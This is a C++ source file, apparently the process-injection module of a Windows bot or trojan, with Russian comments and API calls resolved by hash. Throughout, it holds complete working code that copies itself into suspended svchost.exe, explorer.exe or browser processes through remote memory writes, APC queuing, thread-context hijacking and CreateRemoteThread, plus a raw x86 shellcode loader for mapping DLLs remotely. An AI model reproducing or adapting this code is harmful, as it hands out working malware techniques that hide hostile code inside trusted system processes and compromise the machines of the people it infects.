#include <windows.h>
#include <tlhelp32.h>

#include "GetApi.h"
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotUtils.h"
#include "ntdll.h"

#define MakePtr( cast, ptr, addValue ) (cast)( (DWORD_PTR)(ptr) + (DWORD_PTR)(addValue)) 
#define MakeDelta(cast, x, y) (cast) ( (DWORD_PTR)(x) - (DWORD_PTR)(y)) 

DWORD dwNewBase = 0;

DWORD GetImageBase2()
{
	DWORD dwRet = 0;
  /*	__asm
	{
			call getbase
		getbase:
			pop eax
			and eax, 0ffff0000h
		find:
			cmp word ptr [ eax ], 0x5a4d
			je end
			sub eax, 00010000h
			jmp find
		end:
			mov [dwRet], eax
	} */

	return dwRet;
}

DWORD GetImageBase()
{
/*
(28.12.2010 06:00:39) samuel_ro: Попробуй в асм блоке код: 
(28.12.2010 06:00:48) samuel_ro: db 0xe8
(28.12.2010 06:00:56) samuel_ro: dd 0x00000000
(28.12.2010 06:01:12) samuel_ro: pop eax //eax <- eip
(28.12.2010 06:02:57) samuel_ro: код 0xe800000000 эквивалентен call +0, т.е. вызов команды следующей за call
*/
	
	DWORD dwRet = 0;
	
	DWORD* Addr = (DWORD *)&GetImageBase;

	__asm
	{
			mov EAX, Addr
			and eax, 0FFFF0000h
		find:
			cmp word ptr [ eax ], 0x5A4D
			je end
			sub eax, 00010000h
			JMP find
		end:
			mov [dwRet], eax
	}

	return dwRet;
}



void PerformRebase( LPVOID lpAddress, DWORD dwNewBase )
{
	PIMAGE_DOS_HEADER pDH = (PIMAGE_DOS_HEADER)lpAddress;

	if ( pDH->e_magic != IMAGE_DOS_SIGNATURE )
	{
		return;
	}

	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((char *)pDH + pDH->e_lfanew);

	if ( pPE->Signature != IMAGE_NT_SIGNATURE )
	{
		return;
	}

	DWORD dwDelta = dwNewBase - pPE->OptionalHeader.ImageBase;

	DWORD dwVa = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	DWORD dwCb = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	PIMAGE_BASE_RELOCATION pBR = MakePtr( PIMAGE_BASE_RELOCATION, lpAddress, dwVa );

	UINT c = 0;

	while ( c < dwCb )
	{
		c += pBR->SizeOfBlock;

		int RelocCount = (pBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		LPVOID lpvBase = MakePtr(LPVOID, lpAddress, pBR->VirtualAddress);

		WORD *areloc = MakePtr(LPWORD, pBR, sizeof(IMAGE_BASE_RELOCATION));

		for ( int i = 0; i < RelocCount; i++ )
		{
			int type = areloc[i] >> 12;

			if ( !type )
			{
				continue;
			}

			if ( type != 3 )
			{
				return;
			}

			int ofs = areloc[i] & 0x0fff;

			DWORD *pReloc = MakePtr( DWORD *, lpvBase, ofs );

			if ( *pReloc - pPE->OptionalHeader.ImageBase > pPE->OptionalHeader.SizeOfImage )
			{
				return;
			}

			*pReloc += dwDelta;
		}

		pBR = MakePtr( PIMAGE_BASE_RELOCATION, pBR, pBR->SizeOfBlock );
	}

	pPE->OptionalHeader.ImageBase = dwNewBase;

	return;
}

typedef struct 
{
	WORD	Offset:12;
	WORD	Type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

void ProcessRelocs( PIMAGE_BASE_RELOCATION Relocs, DWORD ImageBase, DWORD Delta, DWORD RelocSize )
{
	PIMAGE_BASE_RELOCATION Reloc = Relocs;

	while ( (DWORD)Reloc - (DWORD)Relocs < RelocSize ) 
	{
		if ( !Reloc->SizeOfBlock )
		{
			break;
		}

		PIMAGE_FIXUP_ENTRY Fixup = (PIMAGE_FIXUP_ENTRY)((ULONG)Reloc + sizeof(IMAGE_BASE_RELOCATION));

		for ( ULONG r = 0; r < (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1; r++ ) 
		{
			DWORD dwPointerRva = Reloc->VirtualAddress + Fixup->Offset;

			if ( Fixup->Offset != 0  )
			{
				*(PULONG)((ULONG)ImageBase + dwPointerRva) += Delta;
			}

			Fixup++;
		}

		Reloc = (PIMAGE_BASE_RELOCATION)( (ULONG)Reloc + Reloc->SizeOfBlock );
	}

	return;
}



DWORD InjectCode( HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartProc )
{
	HMODULE hModule = (HMODULE)GetImageBase();

	PIMAGE_DOS_HEADER pDH = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((LPSTR)pDH + pDH->e_lfanew);

	DWORD dwSize = pPE->OptionalHeader.SizeOfImage;

	LPVOID lpNewAddr = MemAlloc( dwSize );

	if ( lpNewAddr == NULL )
	{
		return -1;
	}

	m_memcpy( lpNewAddr, hModule, dwSize );

	LPVOID lpNewModule = NULL;

	DWORD dwAddr = -1;
	HMODULE hNewModule = NULL;

	if ( (NTSTATUS)pZwAllocateVirtualMemory( hProcess, &lpNewModule, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )
	{
		hNewModule = (HMODULE)lpNewModule;	

		ULONG RelRVA   = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG RelSize  = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( (DWORD)hModule + RelRVA ), (DWORD)lpNewAddr, (DWORD)hNewModule - (DWORD)hModule, RelSize );		

		dwNewBase = (DWORD)hNewModule;

		if ( (NTSTATUS)pZwWriteVirtualMemory( hProcess,   hNewModule, lpNewAddr, dwSize, NULL ) == STATUS_SUCCESS )
		{
			dwAddr = (DWORD)lpStartProc - (DWORD)hModule + (DWORD)hNewModule;
		}
	}

	DWORD dwOldProtect = 0;
	pZwProtectVirtualMemory( hProcess, hNewModule, &dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect );
	
	MemFree( lpNewAddr );
	
	return dwAddr;
}



PVOID RemouteAllocateImageDll(HANDLE hProcess,PVOID pDll)
{
	PIMAGE_DOS_HEADER	pDos;
	PIMAGE_NT_HEADERS	pNt;
	PIMAGE_SECTION_HEADER	Section;
	DWORD NumberOfSection;
	DWORD SizeOfImage;
	PCHAR RemouteAddr = 0;
	PIMAGE_BASE_RELOCATION	pRelocs;
	ULONG dwSize;


	pDos = (PIMAGE_DOS_HEADER) pDll;
	pNt = (PIMAGE_NT_HEADERS) (pDos->e_lfanew + (PCHAR)pDll);

	NumberOfSection = pNt->FileHeader.NumberOfSections;
	SizeOfImage		= pNt->OptionalHeader.SizeOfImage;
	Section			= IMAGE_FIRST_SECTION(pNt);
	
	pRelocs			= (PIMAGE_BASE_RELOCATION)pRtlImageDirectoryEntryToData(pDll,FALSE,IMAGE_DIRECTORY_ENTRY_BASERELOC,&dwSize);

//	настройка секций
//
	if ( (NTSTATUS)pZwAllocateVirtualMemory( hProcess, &RemouteAddr, 0, &SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )
	{
		ULONG i  = 0;

		ULONG	delta = (ULONG)RemouteAddr - pNt->OptionalHeader.ImageBase;
		PCHAR	dest;
		PWORD	relInfo;

		while(i < NumberOfSection)
		{
			dwSize = Section[i].SizeOfRawData;
			pWriteProcessMemory(hProcess,Section[i].VirtualAddress + RemouteAddr,Section[i].PointerToRawData + (PCHAR)pDll,dwSize,&dwSize);
			++i;
		};

//
//	удаленная настройка релоков
		while ( pRelocs->VirtualAddress > 0)
		{
			dest = RemouteAddr + pRelocs->VirtualAddress;
			relInfo = (PWORD)( sizeof(IMAGE_BASE_RELOCATION)+(PCHAR)pRelocs);

			for ( i = 0; i < ((pRelocs->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION)) / 2 ); i++, relInfo++ )
			{
				DWORD dw;
				DWORD *patchAddrHL;
				int type, offset;

				type = *relInfo >> 12;
				offset =*relInfo & 0xfff;

				switch ( type )
				{
					case IMAGE_REL_BASED_ABSOLUTE:
						break;

					case IMAGE_REL_BASED_HIGHLOW:
						patchAddrHL = (DWORD *)(dest + offset);
						if(!pReadProcessMemory(hProcess,patchAddrHL,&dw,sizeof(dw),&dwSize))
							break;
						dw+=delta;
						pWriteProcessMemory(hProcess,patchAddrHL,&dw,sizeof(dw),&dwSize);
						break;

					default:
						break;
				}
			}

			pRelocs =(PIMAGE_BASE_RELOCATION)( pRelocs->SizeOfBlock + (PCHAR)pRelocs);
		};

//
//		запись заголовков
		dwSize = pDos->e_lfanew+ pNt->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER)+ sizeof(DWORD) + sizeof(IMAGE_SECTION_HEADER)*NumberOfSection;	
		pWriteProcessMemory(hProcess,RemouteAddr,pDll,dwSize,&dwSize);

	};



	
	return RemouteAddr;
};

PVOID InjectRemouteDll(HANDLE hProcess,PVOID pDll,DWORD size,PCHAR RunRoutine,PVOID Param)
{
#ifdef _X86_
// loader.asm 
	struct {
		DWORD						ImageBaseDll;
		DWORD						EntryPoint;
		PCHAR						StartExportFunc;
		PVOID						Param;
		PIMAGE_IMPORT_DESCRIPTOR	ImportDesc;	
		DWORD						ImportSize;
	}LoaderConfig;

	char loader[] = {
	
"\xeb\x00\x55\x89\xe5\x83\xec\x04\x8b\x7d\x08\x8b\x07\x89\x45"
"\xfc\x8b\x47\x04\x85\xc0\x74\x15\x50\xff\x75\xfc\xe8\x10\x00"
"\x00\x00\x85\xc0\x74\x08\x8b\x7d\x08\xff\x77\x08\xff\xd0\xc9"
"\xc2\x04\x00\x55\x89\xe5\x56\x57\x53\x52\x51\x31\xc0\x8b\x5d"
"\x08\x66\x8b\x43\x3c\x8d\x3c\x18\x8b\x7f\x78\x8d\x3c\x1f\x8b"
"\x4f\x18\x8b\x77\x1c\x8b\x57\x20\x8d\x34\x1e\x8d\x14\x1a\x85"
"\xc9\x74\x24\x8b\x04\x8a\x8d\x04\x18\x50\xff\x75\x0c\xe8\x3a"
"\x00\x00\x00\x75\x11\x8b\x47\x24\x01\xd8\x0f\xb7\x04\x48\x8b"
"\x04\x86\x03\x45\x08\xeb\x04\xe2\xdc\x31\xc0\x59\x5a\x5b\x5f"
"\x5e\xc9\xc2\x08\x00\x55\x89\xe5\x56\x8b\x75\x08\x8a\x06\x08"
"\xc0\x74\x03\x46\xeb\xf7\x89\xf0\x2b\x45\x08\x5e\xc9\xc2\x04"
"\x00\x55\x89\xe5\x51\x56\x57\xff\x75\x08\xe8\xd8\xff\xff\xff"
"\x89\xc1\xff\x75\x0c\xe8\xce\xff\xff\xff\x39\xc1\x75\x14\x8b"
"\x75\x08\x8b\x7d\x0c\x8a\x07\x38\x06\x75\x08\x46\x47\xe2\xf6"
"\x31\xc0\xeb\x03\x31\xc0\x48\x5f\x5e\x59\xc9\xc2\x08\x00"
};

#endif
		PCHAR			RemouteAddr = (PCHAR)RemouteAllocateImageDll(hProcess,pDll);;
		DWORD LoaderMemSize = sizeof(loader) + sizeof(LoaderConfig) + 1024; 
		DWORD pLoaderStart = 0;

		if(	(NTSTATUS)pZwAllocateVirtualMemory( hProcess, &pLoaderStart, 0, &LoaderMemSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )
		{
			DWORD id;
			DWORD dwOldProtect = 0;
			PVOID tmp_mem = MemAlloc(LoaderMemSize);

			LoaderConfig.ImageBaseDll		= (DWORD) RemouteAddr;
			LoaderConfig.StartExportFunc	=  sizeof(loader) + sizeof(LoaderConfig) + (PCHAR)pLoaderStart;
			LoaderConfig.Param				=  Param;
			LoaderConfig.ImportDesc			= (PIMAGE_IMPORT_DESCRIPTOR)( ((PIMAGE_NT_HEADERS)( (PIMAGE_DOS_HEADER(pDll))->e_lfanew +			\
				(PCHAR)pDll))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);	
			LoaderConfig.ImportSize			= (DWORD)( ((PIMAGE_NT_HEADERS)( (PIMAGE_DOS_HEADER(pDll))->e_lfanew +			\
				(PCHAR)pDll))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);	

			m_memcpy(0 + (PCHAR)tmp_mem,loader,sizeof(loader));

			m_memcpy(sizeof(loader) + (PCHAR)tmp_mem,&LoaderConfig,sizeof(LoaderConfig));

			m_memcpy( (sizeof(loader) + sizeof(LoaderConfig)+ (PCHAR)tmp_mem ),RunRoutine,(DWORD)plstrlenA(RunRoutine) + 1);
			

			pWriteProcessMemory(hProcess,pLoaderStart,tmp_mem,LoaderMemSize,&LoaderMemSize);

			MemFree(tmp_mem);

			pCloseHandle( pCreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)pLoaderStart, sizeof(loader) + (PCHAR)pLoaderStart,0,&id) );
		};

	return RemouteAddr;
};

bool InjectCode2( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwBase = GetImageBase();
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase) + ((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

	HANDLE hMap = pCreateFileMappingA( (HANDLE)-1, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL );

    LPVOID lpView = pMapViewOfFile( hMap, FILE_MAP_WRITE, 0, 0, 0 );

	if ( lpView == NULL )
	{
		return false;
	}

	m_memcpy( lpView, (LPVOID)dwBase, dwSize );

	DWORD dwViewSize    = 0;
	DWORD dwNewBaseAddr = 0;

	NTSTATUS Status = (NTSTATUS)pZwMapViewOfSection( hMap, hProcess, &dwNewBaseAddr, 0, dwSize, NULL, &dwViewSize, 1, 0, PAGE_EXECUTE_READWRITE );

	if ( Status == STATUS_SUCCESS )
	{
		PIMAGE_DOS_HEADER dHeader   = (PIMAGE_DOS_HEADER)dwBase;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)RVATOVA(dwBase, dHeader->e_lfanew);

		ULONG RelRVA   = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG RelSize  = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( dwBase + RelRVA ), (DWORD)lpView, dwNewBaseAddr - dwBase, RelSize );		

		DWORD dwAddr = (DWORD)f_Main - dwBase + dwNewBaseAddr;

	
		if ( (NTSTATUS)pZwQueueApcThread( hThread, (LPTHREAD_START_ROUTINE)dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS )
		{
			pZwResumeThread( hThread, NULL );
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	pUnmapViewOfFile( lpView );
    pCloseHandle( hMap );

	return true;
}

bool InjectCode3( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwAddr = InjectCode( hProcess, f_Main );

	if ( dwAddr != -1 )
	{
		CONTEXT Context;

		m_memset( &Context, 0, sizeof( CONTEXT ) );

		Context.ContextFlags = CONTEXT_INTEGER;
		Context.Eax			 = dwAddr;

		DWORD dwBytes = 0;

        pWriteProcessMemory( hProcess,(LPVOID)( Context.Ebx + 8 ), &dwNewBase, 4, &dwBytes );
        pZwSetContextThread( hThread, &Context );
        pZwResumeThread( hThread, NULL );
	}

	return true;
}

bool CreateSvchost( PHANDLE hProcess, PHANDLE hThread )
{
	WCHAR Svchost[] = {'s','v','c','h','o','s','t','.','e','x','e',0};
	WCHAR Args[]	= {'-','k',' ','n','e','t','s','v','c','s',0};

	WCHAR *SysPath = (WCHAR*)MemAlloc( 512 );

	if ( !SysPath )
	{
		return false;
	}

	pGetSystemDirectoryW( SysPath, 512 );

	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Svchost );

	PROCESS_INFORMATION pi;
	STARTUPINFOW si;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );		
	si.cb	= sizeof( STARTUPINFOW );

	bool ret = false;
	
	if( (BOOL)pCreateProcessW( SysPath, Args, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, &si, &pi ) )
	{
		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		ret = true;
	}

	MemFree( SysPath );
	return ret;
}

bool CreateExplorer( PHANDLE hProcess, PHANDLE hThread )
{
	WCHAR Explorer[] = {'e','x','p','l','o','r','e','r','.','e','x','e',0};

	WCHAR *SysPath = (WCHAR*)MemAlloc( 512 );

	if ( SysPath == NULL )
	{
		return false;
	}

	pGetWindowsDirectoryW( SysPath, 512 );

	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Explorer );


	HANDLE hTmpProcess = NULL;
	HANDLE hTmpThread  = NULL;

	bool ret = RunFileEx( SysPath, CREATE_SUSPENDED, &hTmpProcess, &hTmpThread );

	if ( ret )
	{
		*hProcess = hTmpProcess;
		*hThread  = hTmpThread;
	}

	return ret;
}


WCHAR *GetDefaultBrowserPath()
{
	WCHAR Html[] = {'\\','i','n','d','e','x','.','h','t','m','l',0};

	WCHAR *Path = GetShellFoldersKey( 2 );

	plstrcatW( Path, Html );

	HANDLE hFile = pCreateFileW( Path, 0, 0, 0, CREATE_ALWAYS, 0, 0);

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return false;
	}

	pCloseHandle( hFile );

	WCHAR *BrowserPath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( BrowserPath == NULL )
	{
		return false;
	}

	pFindExecutableW( Path, L"", BrowserPath );

	pDeleteFileW( Path );

	MemFree( Path );

	return BrowserPath;
}

bool CreateDefaultBrowser( PHANDLE hProcess, PHANDLE hThread )
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );		
	si.cb	= sizeof( STARTUPINFOW );

	WCHAR *BrowserPath = GetDefaultBrowserPath();

	if ( BrowserPath == NULL )
	{
		return false;
	}
	
	if( pCreateProcessW( BrowserPath, NULL, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, &si, &pi ) )
	{
		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		return true;
	}

	return false;
}

bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	if ( CreateDefaultBrowser( &hProcess, &hThread ) )
	{
		if ( InjectCode2( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}


bool JmpToSvchostSelf( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	if ( CreateSvchost( &hProcess, &hThread ) )
	{
		if ( InjectCode2( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}


bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) )
{
	if ( !JmpToSvchostSelf( f_Main ) )
	{
		if ( !JmpToBrowserSelf( f_Main ) )
		{
			return false;
		}
	}

	return true;
}

bool JmpToBrowser( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	if ( CreateDefaultBrowser( &hProcess, &hThread ) )
	{
		if ( InjectCode3( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}

bool JmpToSvchost( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	bool bRet = false;

	if ( CreateSvchost( &hProcess, &hThread ) )
	{
		if ( InjectCode3( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}


bool TwiceJump( DWORD (WINAPI f_Main)(LPVOID) )
{
	if ( !JmpToSvchost( f_Main ) )
	{
		if ( !JmpToBrowser( f_Main ) )
		{
			return false;
		}
	}

	return true;
}

bool MegaJump( DWORD (WINAPI f_Main)(LPVOID) )
{
	if ( !TwiceJumpSelf( f_Main ) )
	{
		if ( !TwiceJump( f_Main ) )
		{
			return false;
		}
	}

	return true;
}

bool JmpToExplorer( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	bool bRet = false;

	if ( CreateExplorer( &hProcess, &hThread ) )
	{
		if ( InjectCode2( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	return false;
}


bool InjectIntoExplorer( DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwPid = GetExplorerPid();

	if ( dwPid == 0 )
	{
		return false;
	}

	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ) } ;
	CLIENT_ID ClientID;

	ClientID.UniqueProcess = (HANDLE)dwPid;
	ClientID.UniqueThread  = 0;

	HANDLE hProcess;
		
	if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
	{
		return false;
	}

	DWORD dwAddr = InjectCode( hProcess, f_Main );

	bool ret = false;

	if ( dwAddr != -1 )
	{
		if ( pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)dwAddr, NULL, 0, 0 ) != NULL )
		{
			ret = true;
		}
	}

	pZwClose( hProcess );
	
	return ret;
}


bool InjectDll( WCHAR *DllPath )
{
	if ( pGetFileAttributesW( DllPath ) )
	{
		HANDLE hProcess;
		HANDLE hThread;

		if ( !CreateSvchost( &hProcess, &hThread ) )
		{
			if ( !CreateDefaultBrowser( &hProcess, &hThread ) )
			{
				return false;
			}
		}
		
		DWORD dwWritten;

		LPVOID lpStringLoc = pVirtualAllocEx( hProcess, 0, m_wcslen( DllPath ) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
		
		if ( !(BOOL)pWriteProcessMemory( hProcess, lpStringLoc, DllPath, m_wcslen( DllPath ) + 1, &dwWritten ) )
		{
			return false;
		}

		pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddressEx( NULL, 1, 0xC8AC8030 ), lpStringLoc, 0, 0 );
	}
		
	
	return true;
}








